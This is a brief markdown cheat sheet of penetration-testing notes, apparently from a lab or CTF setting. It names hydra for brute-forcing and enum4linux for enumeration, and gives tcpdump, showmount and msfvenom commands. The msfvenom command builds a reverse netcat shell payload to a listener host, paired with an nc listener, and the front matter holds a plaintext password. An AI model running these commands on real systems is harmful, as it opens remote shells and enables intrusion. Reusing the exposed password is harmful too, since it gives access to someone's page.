---
description: draft.3os.re
password: 8(Y2P8U3KpRAS7im^W!
disqus: ""
---

# Draft PT

## Tools

* hydra - brutforece
* enum4linux - enumaration

## lisent fot Ping/icmp on interface

```bash
sudo tcpdump ip proto \\icmp -i eth0
```

## reverse netcat shell

Payload R(row)

```bash
msfvenom -p cmd/unix/reverse_netcat lhost=10.11.19.49 lport=4444 R
```

listener:

```bash
nc -lvp 4444
```

## NFS show mount

```bash
showmount -e 10.10.87.232
```
